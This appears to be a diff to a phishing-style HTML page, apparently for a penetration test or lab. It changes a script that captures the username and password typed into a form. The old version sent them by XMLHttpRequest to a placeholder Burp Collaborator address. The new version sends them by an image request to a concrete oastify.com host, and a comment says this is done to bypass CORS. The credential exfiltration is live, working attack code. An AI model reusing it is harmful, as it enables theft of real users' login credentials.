@@ -28,13 +28,12 @@
     </style>
     <script type="text/javascript">
         function sendData() {
-            var username = document.getElementById("username").value;
-            var password = document.getElementById("password").value;
+            var username = encodeURIComponent(document.getElementById("username").value);
+            var password = encodeURIComponent(document.getElementById("password").value);
             
-            // Send the captured data to Burp Collaborator via HTTP GET request
-            var xhr = new XMLHttpRequest();
-            xhr.open("GET", "http://<BURP_COLLABORATOR_URL>/?user=" + encodeURIComponent(username) + "&pass=" + encodeURIComponent(password), true);
-            xhr.send();
+            // Send the captured data to Burp Collaborator via an image request to bypass CORS
+            var img = new Image();
+            img.src = "http://ie0anh0zfz9ewk8lowzenmuy4paoyjm8.oastify.com/?username=" + username + "&password=" + password;
         }
     </script>
 </head>
